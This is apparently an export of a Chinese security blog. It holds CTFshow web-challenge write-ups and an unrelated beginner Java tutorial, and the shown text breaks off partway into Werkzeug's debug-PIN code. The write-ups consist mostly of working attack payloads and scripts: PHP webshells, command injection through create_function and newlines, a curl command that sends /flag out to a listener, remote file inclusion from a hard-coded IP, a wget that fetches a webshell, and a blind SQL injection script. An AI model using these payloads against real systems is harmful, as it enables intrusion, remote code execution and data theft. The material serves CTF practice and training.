if(sha256(k[0].substr(0,4))!==\"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400\"){\n        return alert(e)\n    }\n\n    if(sha256(k[0].substr(4,8))!==\"f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc\"){\n        return alert(e)\n    }\n\n\n\n    if(parseInt(k[1][0])!==(c2n('a')-1)){\n        return alert(e)\n    }\n\n    if(k[1][1]+k[1][2]+k[1][3]!=='dda'){\n        return alert(e)\n    }\n\n    if(k[2][1]!=='e'){\n        return alert(e)\n    }\n\n    if(k[2][0]+k[2][2]+k[2][3]!=0x1ae){\n        return alert(e)\n    }\n\n\n    if(parseInt(k[3][0])!==(c2n('a')-1)){\n        return alert(e)\n    }\n\n    if(parseInt(k[3][1])!==parseInt(k[3][3])){\n        return alert(e)\n    }\n\n    if(parseInt(k[3][3])*2+c2n('a')!==0x12){\n        return alert(e)\n    }\n\n    if(sha224(k[3][2])!=='abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5'){\n        return alert(e)\n    }\n\n    if(st3(k[4])!=='GVSTMNDGGQ2DSOLBGUZA===='){\n        return alert(e)\n    }\n\n    alert('you are right')\n}\n\n\n\n\nconst Base64 = {\n    _keyStr: \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\",\n    encode: function (e) {\n        var t = \"\";\n        var n, r, i, s, o, u, a;\n        var f = 0;\n        e = Base64._utf8_encode(e);\n        while (f < e.length) {\n            n = e.charCodeAt(f++);\n            r = e.charCodeAt(f++);\n            i = e.charCodeAt(f++);\n            s = n >> 2;\n            o = (n & 3) << 4 | r >> 4;\n            u = (r & 15) << 2 | i >> 6;\n            a = i & 63;\n            if (isNaN(r)) {\n                u = a = 64\n            } else if (isNaN(i)) {\n                a = 64\n            }\n            t = t + this._keyStr.charAt(s) + this._keyStr.charAt(o) + this._keyStr.charAt(u) + this._keyStr.charAt(a)\n        }\n        return t\n    },\n    decode: function (e) {\n        var t = \"\";\n        var n, r, i;\n        var s, o, u, a;\n        var f = 0;\n        e = e.replace(/[^A-Za-z0-9+/=]/g, \"\");\n        while (f < e.length) {\n            s = this._keyStr.indexOf(e.charAt(f++));\n            o = this._keyStr.indexOf(e.charAt(f++));\n            u = this._keyStr.indexOf(e.charAt(f++));\n            a = this._keyStr.indexOf(e.charAt(f++));\n            n = s << 2 | o >> 4;\n            r = (o & 15) << 4 | u >> 2;\n            i = (u & 3) << 6 | a;\n            t = t + String.fromCharCode(n);\n            if (u != 64) {\n                t = t + String.fromCharCode(r)\n            }\n            if (a != 64) {\n                t = t + String.fromCharCode(i)\n            }\n        }\n        t = Base64._utf8_decode(t);\n        return t\n    },\n    _utf8_encode: function (e) {\n        e = e.replace(/rn/g, \"n\");\n        var t = \"\";\n        for (var n = 0; n < e.length; n++) {\n            var r = e.charCodeAt(n);\n            if (r < 128) {\n                t += String.fromCharCode(r)\n            } else if (r > 127 && r < 2048) {\n                t += String.fromCharCode(r >> 6 | 192);\n                t += String.fromCharCode(r & 63 | 128)\n            } else {\n                t += String.fromCharCode(r >> 12 | 224);\n                t += String.fromCharCode(r >> 6 & 63 | 128);\n                t += String.fromCharCode(r & 63 | 128)\n            }\n        }\n        return t\n    },\n    _utf8_decode: function (e) {\n        var t = \"\";\n        var n = 0;\n        var r = c1 = c2 = 0;\n        while (n < e.length) {\n            r = e.charCodeAt(n);\n            if (r < 128) {\n                t += String.fromCharCode(r);\n                n++\n            } else if (r > 191 && r < 224) {\n                c2 = e.charCodeAt(n + 1);\n                t += String.fromCharCode((r & 31) << 6 | c2 & 63);\n                n += 2\n            } else {\n                c2 = e.charCodeAt(n + 1);\n                c3 = e.charCodeAt(n + 2);\n                t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);\n                n += 3\n            }\n        }\n        return t\n    }\n}\n\n\n\nfunction st3(srcString) {\n    if (!srcString) {\n        return '';\n    }\n\n    let BASE32CHAR = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\";\n    let i = 0;\n    let index = 0;\n    let digit = 0;\n    let currByte;\n    let nextByte;\n    let retrunString = '';\n    srcString = Base64._utf8_encode(srcString);\n\n    for (let i = 0; i < srcString.length;) {\n        currByte = (srcString.charCodeAt(i) >= 0) ? srcString.charCodeAt(i)\n            : (srcString.charCodeAt(i) + 256);\n\n        if (index > 3) {\n            if ((i + 1) < srcString.length) {\n                nextByte = (srcString.charCodeAt(i + 1) >= 0)\n                    ? srcString.charCodeAt(i + 1)\n                    : (srcString.charCodeAt(i + 1) + 256);\n            } else {\n                nextByte = 0;\n            }\n\n            digit = currByte & (0xFF >> index);\n            index = (index + 5) % 8;\n            digit <<= index;\n            digit |= (nextByte >> (8 - index));\n            i++;\n        } else {\n            digit = (currByte >> (8 - (index + 5))) & 0x1F;\n            index = (index + 5) % 8;\n\n            if (index == 0) {\n                i++;\n            }\n        }\n\n        retrunString = retrunString + BASE32CHAR.charAt(digit);\n    }\n    while((retrunString.length % 8) !== 0){\n        retrunString += \"=\";\n    }\n    return retrunString;\n}\n```\n\n分析代码，要求flag符合下列条件\n\n1. 前八位为字符串`ctfshow{`，结尾为`}`\n2. flag经过sha256运算的结果为`e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d`\n3. 中间内容长度为36，有4个UUID分块`-`\n4. c2n函数的作用：将UUID中的内容转换为10进制数\n5. s2n2su函数的作用：将UUID中每一位的数字相加并返回最终的值\n6. 第一个UUID分段的UUID和值为63\n7. 第一个UUID分段的前四位经过sha256运算后的结果是`c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400`，结果为`592b`\n8. 第一个UUID分段后4位经过sha256运算后的结果是`f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc`，结果为`9d77`\n9. 第二个UUID分段是`9dda`\n10. 第三个UUID的第二位是e，并且剩余三位的连接后为430\n11. 第四个UUID为`94a4`\n12. 第五个UUID经过base32编码结果为`GVSTMNDGGQ2DSOLBGUZA====`\n\n最终构造出flag\n\n```\nctfshow{592b9d77-9dda-4e30-94a4-5e64f4499a52}\n```\n\n顺便贴个爆破脚本\n\n```python\nimport hashlib\nfrom itertools import *\nstring=\"0123456789abcdef\"\nk=product(string,repeat=4)\nfor i in k:\n    aaa=\"\".join(i)\n    out1 = hashlib.sha256(aaa.encode(\"utf-8\")).hexdigest()\n    if(out1=='c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400'):\n        print(aaa)\n    if(out1=='f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc'):\n        print(aaa)\n```\n\n**683**\n\n明显的弱类型比较\n\n```php\n<?php \n   include \"flag.php\"; \n   if(isset($_GET['秀'])){ \n       if(!is_numeric($_GET['秀'])){ \n          die('必须是数字'); \n       }else if($_GET['秀'] < 60 * 60 * 24 * 30 * 2){ \n          die('你太短了'); \n       }else if($_GET['秀'] > 60 * 60 * 24 * 30 * 3){ \n           die('你太长了'); \n       }else{ \n           sleep((int)$_GET['秀']); \n           echo $flag; \n       } \n   } \n```\n\n自动转换时xex会被转换为原始数字，int强制转换string时取到字母停止\n\n```\npayload:?秀=0.6e7\n```\n\n**684**\n\n源码在此\n\n```php\n<?php\n$action = $_GET['action'] ?? '';\n$arg = $_GET['arg'] ?? '';\n\nif(preg_match('/^[a-z0-9_]*$/isD', $action)) {\n    show_source(__FILE__);\n} else {\n    $action('', $arg);\n}\n```\n\n变量$action要出现数字字母以外的字符，还要执行函数，使用\\create_function，这里利用的是php环境中默认的namespace\n\n> php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 接下来第二个参数可以引发危险的函数。\n\n> create_function()是PHP中的内置函数，用于在PHP中创建匿名(lambda-style)函数。\n>\n> **用法:**\n>\n> ```\n> string create_function ( $args, $code )\n> ```\n>\n> **参数：**该函数接受以下两个参数：\n>\n> - **$args:**它是一个字符串类型的函数参数。\n> - **$code:**它是字符串类型的函数代码。\n>\n> **注意：**通常，这些参数将作为单引号分隔的字符串传递。使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，将需要双引号来转义变量名，例如\\ $avar。\n>\n> **返回值：**此函数以字符串形式返回唯一的函数名称，否则，在错误时返回FALSE。\n\n而对于create_function函数来说，实际执行的内容如下\n\n```\nfunction noname($args) { $code }\n```\n\n结尾我们使用}闭合，最终的payload如下\n\n```\npayload:?action=%5ccreate_function&arg=}system('tac /secret_you_never_know');/*\n```\n\n**685**\n\n利用正则最大回溯次数绕过\n\n> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit\n> 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过正则表达式了。\n\n```python\nimport requests\nurl=\"http://b826efef-6cde-4fa8-84d3-4cb699605ab2.challenge.ctf.show\"\nfiles={\n\t'file':'<?php eval($_POST[1]);?>'+'b'*1000000\n}\nr=requests.post(url,files=files)\nprint(r.text)\n```\n\n**686**\n\n无参RCE\n\n```\npayload:?code=system(current(getallheaders()));\nX-Forwarded-Host: cat /secret_you_never_know\n```\n\n**687**\n\n换行执行命令\n\n```\npayload:?ip=1%0atac /flaaag\n```\n\n**688**\n\n俩函数一起用有的问题\n\n`escapeshellarg();\nescapeshellcmd();`\n\n```\npayload:?url=http://监听使用的ip:port/' -F file=@/flag'\n```\n\n实际传入shell的是\n\n```shell\ncurl 'http://IP:端口/'\\\\'' -F file=@/flag'\\\\'''\n```\n\n直接带出文件\n\n**689**\n\n```php\n<?php \nerror_reporting(0);\nif(isset($_GET) && !empty($_GET)){\n    $url = $_GET['file'];\n    $path = \"upload/\".$_GET['path'];\n    \n}else{\n    show_source(__FILE__);\n    exit();\n}\n\nif(strpos($path,'..') > -1){\n    die('This is a waf!');\n}\n\n\nif(strpos($url,'http://127.0.0.1/') === 0){\n    file_put_contents($path, file_get_contents($url));\n    echo \"console.log($path update successed!)\";\n}else{\n    echo \"Hello.CTFshow\";\n}\n```\n\n这里在path位置没有过滤，也就是说不管我们在path位置写入什么都会原封不动的返回，所以此时我们让docker访问自己，在path处传入木马即可\n\n```\nhttp://f784bf7a-ace9-414a-bbfd-cfd348cefd95.challenge.ctf.show/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path=%3C?php%20eval($_POST[1]);?%3E&path=b.php\n```\n\n**690**\n\n```php\n<?php \nhighlight_file(__FILE__);\nerror_reporting(0);\n$args = $_GET['args'];\nfor ( $i=0; $i<count($args); $i++ ){\n    if ( !preg_match('/^\\w+$/', $args[$i]) )\n        exit(\"sorry\");\n}\n\nexec('./ ' . implode(\" \", $args));\n```\n\n传入的命令中只能有字母和数字，执行命令可用换行绕过，问题是我们要如何构造命令来执行，首先因为没有回显，所以直接执行是行不通的，那可以尝试写一个文件，构造一个服务器返回内容为一句话木马的脚本\n\n```\n\n\n```\n\n构造如下命令\n\n```\nmkdir a\ncd a\nwget 10进制服务器IP\n```\n\n此时a文件夹下就有一个index.html内容为一句话木马，但是我们还没办法执行，此时我们利用tar来将文件类型进行更改\n\n```\ntar cvf shell a\n```\n\n将a文件夹打包成一个shell文件就可以执行了\n\n**691**\n\n```php\n<?php\ninclude('inc.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction   filter($str){\n      $filterlist = \"/\\(|\\)|username|password|where|\n      case|when|like|regexp|into|limit|=|for|;/\";\n      if(preg_match($filterlist,strtolower($str))){\n        die(\"illegal input!\");\n      }\n      return $str;\n  }\n$username = isset($_POST['username'])?\nfilter($_POST['username']):die(\"please input username!\");\n$password = isset($_POST['password'])?\nfilter($_POST['password']):die(\"please input password!\");\n$sql = \"select * from admin where  username =\n '$username' and password = '$password' \";\n$res = $conn -> query($sql);\nif($res->num_rows>0){\n  $row = $res -> fetch_assoc();\n  if($row['id']){\n     echo $row['username'];\n  }\n}else{\n   echo \"The content in the password column is the flag!\";\n}\n?>\n```\n\norder by盲注，贴个[链接](https://blog.csdn.net/miuzzx/article/details/104908543)，原理就是通过password位置的字符串的比较导致回显中username的内容不同来判断结果，直接写脚本吧\n\n```python\nimport requests\nflagstr=\"-01234567890abcdefghiostw{}---\"\nurl=\"http://9446af78-f5bd-4d30-94b4-05dc5eb8f887.challenge.ctf.show/\"\nflag=\"\"\nfor i in range(0,100):\n    for j in range(1,len(flagstr)):\n        tmp=flag+flagstr[j]\n        data={'username':f\"'or 1 union select 1,2,'{tmp}' order by 3#\",\"password\":\"1\"}\n        tex=requests.post(url=url,data=data).text\n        if \"</code>admin\" in tex:\n            print(flag+flagstr[j-1])\n            flag=flag+flagstr[j-1]\n            break\n```\n\n**692**\n\n看一下preg_replace函数的用法\n\n> # preg_replace\n>\n> (PHP 4, PHP 5, PHP 7, PHP 8)\n>\n> preg_replace — 执行一个正则表达式的搜索和替换\n>\n> ### 说明\n>\n> ```\n> preg_replace(\n>   string|array $pattern,\n>   string|array $replacement,\n>   string|array $subject,\n>   int $limit = -1,\n>   int &$count = null\n> ): string|array|null\n> ```\n>\n> 搜索 `subject` 中匹配 `pattern` 的部分，以 `replacement` 进行替换。\n>\n> ```\n> replacement\n> ```\n>\n> 用于替换的字符串或字符串数组。如果这个参数是一个字符串，并且 `pattern` 是一个数组，那么所有的模式都使用这个字符串进行替换。如果 `pattern` 和 `replacement` 都是数组，每个 `pattern` 使用 `replacement`中对应的元素进行替换。如果 `replacement` 中的元素比 `pattern` 中的少，多出来的 `pattern` 使用空字符串进行替换。\n>\n> `replacement` 中可以包含后向引用 `\\\\n` 或 `$n`，语法上首选后者。 每个这样的引用将被匹配到的第 n 个捕获子组捕获到的文本替换。 n 可以是0-99，`\\\\0` 和 `$0` 代表完整的模式匹配文本。捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从1开始数。如果要在 `replacement` 中使用反斜线，必须使用 4 个(`\"\\\\\\\\\"`，译注：因为这首先是 PHP 的字符串，经过转义后，是两个，再经过正则表达式引擎后才被认为是一个原文反斜线)。\n\n此处如果将replacement中内容放入`\\\\0`那么就会直接匹配前面pattern中的结果\n\n> preg_replace中的第二个参数如果是%00也就是ascii中的0,那么将会匹配到整个字符串。\n> 比如初始的字符串为\n> $option='123';\n> 如果执行\n> preg_replace(\"$option='.*';\",\"\\x00\",$a)\n> 那么返回的结果是\n> $option='$option='123';';\n> 其实就是把原来的字符串又放到单引号里面了。\n> 假设我们第一次传option=;phpinfo();//\n> 首先config.php中的内容会被替换成$option=';phpinfo();//'。\n> 如果我们第二次传option=%00\n> 那么最终的结果是$option='$option=';phpinfo();//''\n> 这样就逃出了单引号，phpinfo()也就执行成功\n> ————————————————\n> 版权声明：本文为CSDN博主「yu22x」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n> 原文链接：https://blog.csdn.net/miuzzx/article/details/122998220\n\n**693**\n\nextract函数加远程文件包含\n\n```\n?function=extract&file=http://45.15.131.101/\n```\n\n**694**\n\n构造X-Forwarded-For请求头为文件名，file为.即可直接写入到请求头所构造的文件名中\n\n```\n/var/www/html/a.php/.\n```\n\n695\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"Java入门","url":"/posts/63f03572.html","content":"\n# JAVA\n\n**Hello World!**\n\n```java\n//Main.java\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello world!\");\n    }\n}\n//javac Main.java\n//java Main\n//JDK 11以后支持直接使用java执行源代码\n```\n\n**JDK（Java开发工具包）组成**\n\n- JVM：Java虚拟机，java程序运行的地方\n- 核心类库：Java自带类，供程序员调用\n- JRE：Java运行环境\n\n**数据类型**\n\n基本数据类型\n\n- 整数\n  - byte    1字节\n  - short    2字节\n  - int（默认）    4字节\n  - long    8字节（整数定义时需要在数字末尾加L）\n- 浮点数\n  - float    4字节（定义时需要在数字末尾加F）\n  - double（默认）    8字节\n- 字符：char 2字节\n- 布尔：boolen\n\n引用数据类型\n\n\n\n\n\n\n\n\n\n\n\n**类型转换**\n\n默认类型转换，小的自动换成大的\n\n```java\nbyte a=1;\nbyte b=1;\nbyte c=a+b;//此处程序报错，因为ab在进行加运算前已经执行被转换成int类型\nint c=a+b;//此处正确\n```\n\n**运算符**\n\n和C++一样，字符串的优先级拉满\n\n**Java原生API**\n\n[官方文档](https://www.oracle.com/java/technologies/javase-jdk17-doc-downloads.html)\n\n**Java用户输入（练习系统API使用）**\n\n```java\nimport java.util.Scanner;//导入Scanner包\npublic class scannerDemo {\n    public static void main(String[] args) {\n        Scanner s=new Scanner(System.in);//创建一个Scanner对象\n        System.out.print(\"请输入您的年龄：\");\n        int age=s.nextInt();//获取Scanner得到的内容\n        System.out.println(\"您的年龄是：\"+age);\n    }\n}\n```\n\n**程序流程控制**\n\nif，switch，for，while和C++完全一致\n\n**Random包**\n\n```java\nimport java.util.Random;\npublic class randomDemo {\n    public static void main(String[] args) {\n        Random r=new Random();\n        int shu=r.nextInt(10);//0-9范围\n    }\n}\n```\n\n**数组**\n\n```java\n//静态初始化数组\nint[] arr={20,10,234,22,15};\nString[] name={\"PSR\",\"ZYL\",\"HZJ\"}\n//动态初始化数组\nint [] arr=new int[10]\n```\n\n动态初始化数组默认值：\n\n整型：0\n\n浮点型：0.0\n\n布尔：false\n\n引用类型：null\n\n**方法（就函数啦）**\n\n完整定义格式：\n\n```\n修饰符 返回值类型 方法名(形参){\n    方法体代码\n    return 返回值;\n}\n```\n\n```java\npublic static int sum(int a,int b){\n    int c=a+b;\n    System.out.println(\"您求的和为：\"+c);\n    return c;\n}\n```\n\n其他定义格式：\n\n可以没有返回值（void），没有参数\n\n**方法数据传递机制**\n\n基本类型参数传递：传值\n\n引用类型参数传递：传地址\n\n**方法重载**\n\n方法名一样参数不一样的方法\n\n**类**\n\n```java\npackage top.darkflow.OP;\npublic class Phone{\n    String brand;\n    double price;\n    public void start(){\n        System.out.println(\"欢迎使用\"+brand+\"手机\");\n    }\n}\n//构造器写法与C++相同\n//this关键在代表当前对象的地址\n```\n\n**JavaBean**\n\n也被称作实体类，其对象可用于在程序中封装数据\n\n要求：\n\n- 成员变量用private修饰\n- 提供对应成员变量的get与set方法\n- 必须有一个无参构造器，有参构造可有可无\n\n**String类**\n\n不可变：指原始字符串不可变，经过+运算后产生新的字符串\n\n创建方式\n\n```\nString s=new String(\"flag\");\nchar[] chars={'f','l','a','g'};\nString s=new String(chars);\nbyte[] bytes={102,108,97,103}\nString s=new String(bytes);\n```\n\n**String常用API**\n\n```\ns1.equals(s2)//比较s1，s2字符串内容是否相同equalsIgnoreCase忽略大小写\ns1.charAt(Index)//获取Index位置的字符\ns1.toCharArray()//将字符串转换为char数组\ns1.substring(head,end)//截取字符串\ns1.replace(target,replacement)//将字符串中的target用replacement替换\ns1.contains(s)//字符串中是否包含s字符串\ns1.startWiths(s)//字符串是否以s字符串开始\ns1.spilt(s)//以s为分割符来将字符串切割\n```\n\n**ArrayList**\n\n```\nArrayList list=new ArrayList()\nlist.add(ele)//向列表中添加元素（无类型限制）\nlist.add(index,ele)//向列表指定位置插入元素\n```\n\nArrayList支持泛型，可通过`ArrayList<数据类型>`来限定列表中的数据类型\n\n一些API\n\n```\nlist.get(index)//获取指定位置元素\nlist.size()//获取列表元素个数\nlist.remove(index)//删除指定位置的元素\nlist.set(index,ele)//修改指定位置的元素\n```\n\n### 面向对象咯\n\n**static关键字**\n\n- static是静态的意思，可以用来修饰成员变量和成员方法\n- static修饰成员变量表示该成员变量值在内存中储存一份，可以被共享访问修改\n- 静态成员变量常用来表示需要被共享的信息，可以被共享访问\n- 静态成员变量和方法访问时可通过`类名.成员`也可通过`对象名.成员`访问，建议通过类访问\n- 在同一个类中，访问静态方法，类名可以省略不写\n- 注意调用静态成员方法（包括通过对象调用），方法中不能调用非静态成员变量哦（如下图）\n- ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207050029328.png)\n- 静态方法中不可以出现this关键字\n\n**静态方法应用**\n\n- 可用于构造工具类，由于不需要进行实例化，可将类的构造函数设置成私有权限\n\n**代码块**\n\n定义：花括号括起来的都是代码块\n\n- static代码块（static{}）：\n  - 属于类，与类一起优先加载（比main还快）一次，自动触发执行\n  - 作用：可以用于初始化静态资源，一边后续使用\n- 实例代码块（{}）：\n  - 属于对象，每次构建对象时，都会出发一次执行\n  - 作用：初始化实例资源\n\n**设计模式**：在开发中经常遇到的问题的最优解\n\n**单例模式**\n\n一个类只能创建一个对象\n\n```java\n//饿汉单例，在类加载时直接创造对象\npublic class danli {\n    public static danli dddd=new danli();\n    private danli(){\n        System.out.println(\"单例被创建\");\n    }\n}\n//懒汉单例，在类实例首次被调用时创造对象\npublic class danli {\n    public static danli dddd;\n    private danli(){\n        System.out.println(\"单例被创建\");\n    }\n    public static danli getInstance(){\n        if(dddd==null){\n            dddd=new danli();\n        }\n        return dddd;\n    }\n}\n```\n\n**继承**\n\n- ```\n  public class Son extends Father {}\n  ```\n\n- super关键字\n\n  - `super`可以用来引用直接父类的实例变量。\n  - `super`可以用来调用直接父类方法。\n  - `super()`可以用于调用直接父类构造函数。\n\n- 构造方法：默认先执行父类无参构造，再执行自己构造\n\n**包**\n\n- 包是用来分别管理各种不同的类的，类似文件夹，建包有利于程序的管理和维护\n- 包名语法格式：域名倒写.技术名称\n- 建包语句必须在第一行\n- 相同包下的类可直接访问，不同包下类必须导包，`import 包名.类名`\n- 如果该类中使用不同包下相同的类名，此时默认只能导入一个类的包，另一个类的要使用全名访问\n\n**权限修饰符**\n\n- 私有：`private`\n  - 只能在本类中访问\n- 缺省：啥都不加\n  - 只能本类，本包下访问\n- 保护：`protected`\n  - 本类，同包的其他类中，其他包的子类中\n- 公共：`public`\n  - 谁都能访问\n\n**final关键字**\n\n- 修饰类：表明最终类，不可被继承\n- 修饰方法：表明最终方法，不可被重写\n- 修饰变量：表明变量经过首次赋值后，不能再次被赋值\n- 常量定义：`public static final`\n\n**枚举**\n\n- 作用：为了做信息的标志和信息的分类\n\n- ```java\n  修饰符 enum 枚举名称{\n  \t第一行都是罗列枚举类实例的名称\n  }\n  ```\n\n- 枚举都继承自枚举类型：`java.lang.Enum`\n\n- 枚举类都是最终类\n\n- 构造器的构造器都是私有的，枚举对外不能创建对象\n\n- 枚举类的第一行默认都是罗列枚举对象的名称的\n\n- 枚举类相当于是多例模式\n\n- ```java\n  //枚举类的作用实例代码\n  //例如开发游戏接受用户输入的四个方向的信号\n  //如果选择常量，具有可读性但是入参值不受约束\n  //Orientation.java\n  public enum Orientation {\n      UP,DOWN,LEFT,RIGHT\n  }\n  //zhu.java\n  public class zhu {\n      public static void move(Orientation o){\n          switch (o){\n              case UP -> System.out.println(\"往上走\");\n              case DOWN ->System.out.println(\"往下走\");\n              case LEFT -> System.out.println(\"往左走\");\n              case RIGHT -> System.out.println(\"往右走\");\n          }\n      }\n      public static void main(String[] args) {\n          move(Orientation.RIGHT);\n      }\n  }\n  ```\n\n- ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207061509169.png)\n\n**抽象**\n\n- abstract修饰的类就是抽象类，修饰的方法就是抽象方法\n\n- 写抽象方法时不能写方法体\n\n- 如果一个类中的方法被声明成为抽象方法，那么这个类必须被声明为抽象类\n\n- ```java\n  public abstract class animal {\n      public abstract void run();\n  }\n  ```\n\n- 抽象类可以理解为不完整的设计图，一般做父类\n\n- 当父类知道子类需要完成某些行为，而各个子类实现方法又不同，就把该类定义为抽象方法\n\n**接口**\n\n- ```java\n  //接口定义\n  public interface 接口名{\n  \t\t//常量\n  \t\t//抽象方法\n  }\n  ```\n\n- ```java\n  //接口实现\n  class 类名 implements 接口1,接口2...{\n  \t\t//抽象方法重写\n  }\n  ```\n\n- 接口可以多继承，一个接口可以继承多个接口\n\n- 接口不能创建对象\n\n- 一个类实现多个接口，多个接口中有同样的静态方法不冲突\n\n- 一个类继承了父类又实现了接口，父类和接口中的同名方法，默认使用父类的\n\n- 一个类实现了多个接口，多个接口中存在同名的默认方法，不冲突，这个类重写该方法即可\n\n- 一个接口继承多个接口是没有问题的，如果多个接口中存在规范冲突则不能继承\n\n- JDK8开始对接口做的新增方法\n\n  - 接口中可以有带方法实现的方法\n  - 默认方法：类似之前的普通方法，使用defalut修饰，默认用public修饰。需要用接口实现类的对象来调用\n  - 静态方法：使用static修饰，接口静态方法必须用本身的接口名来调用\n  - 私有方法：使用private修饰，只能在本类（本接口）中被其他的默认方法或者私有方法访问\n"},{"title":"CTFshowCMS","url":"/posts/478f3262.html","content":"\n**477**\n\ncmseasy 5.7，百度搜搜漏洞，有后台getshell\n\n首先/admin登录后台，admin:admin直接登录，在模版—自定义标签中写入payload\n\n```\n1111111111111\";}<?php phpinfo();?>\n```\n\n环境变量里面找吧\n\n**478**\n\nphpcms 9.6.0\n\n**479**\n"},{"title":"CTFshow常用姿势","url":"/posts/eaf7f5df.html","content":"\n**801**\n\n### flask计算PIN\n\n**什么是PIN码**\n\nPIN码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式\n\n**注意事项：谨记！！python 3.8（md5）和3.6（sha1）pin码生成方式不同**\n\n**使用条件：flask debug模式开启 存在任意文件读取**\n\n首先是python PIN码的生成脚本\n\n```python\n#生效时间为一周\nPIN_TIME = 60 * 60 * 24 * 7\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\n_machine_id: t.Optional[t.Union[str, bytes]] = None\n\n#获取机器号\ndef get_machine_id() -> t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -> t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n            #读取文件进行拼接\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n            #继续进行拼接，这里处理一下只要/docker后的东西\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n            # subprocess may not be available, e.g. Google App Engine\n            # https://github.com/pallets/werkzeug/issues/925\n            from subprocess import Popen, PIPE\n\n            dump = Popen(\n                [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE\n            ).communicate()[0]\n            match = re.search(b'\"serial-number\" = <([^>]+)', dump)\n\n            if match is not None:\n                return match.group(1)\n        except (OSError, ImportError):\n            pass\n\n        # On Windows, use winreg to get the machine guid.\n        if sys.platform == \"win32\":\n            import winreg\n\n            try:\n                with winreg.OpenKey(\n                    winreg.HKEY_LOCAL_MACHINE,\n                    \"SOFTWARE\\\\Microsoft\\\\Cryptography\",\n                    0,\n                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,\n                ) as rk:\n                    guid: t.Union[str, bytes]\n                    guid_type: int\n                    guid, guid_type = winreg.QueryValueEx(rk, \"MachineGuid\")\n\n                    if guid_type == winreg.REG_SZ:\n                        return guid.encode(\"utf-8\")\n\n                    return guid\n            except OSError:\n                pass\n\n        return None\n\n    _machine_id = _generate()\n    return _machine_id\n\n\nclass _ConsoleFrame:\n    \"\"\"Helper class so that we can reuse the frame console code for the\n    standalone console.\n    \"\"\"\n\n    def __init__(self, namespace: t.Dict[str, t.Any]):\n        self.console = Console(namespace)\n        self.id = 0\n\n\ndef get_pin_and_cookie_name(\n    app: \"WSGIApplication\",\n) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:\n    \"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__)\n    username: t.Optional[str]\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", type(app).__name__),\n        getattr(mod, \"__file__\", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n 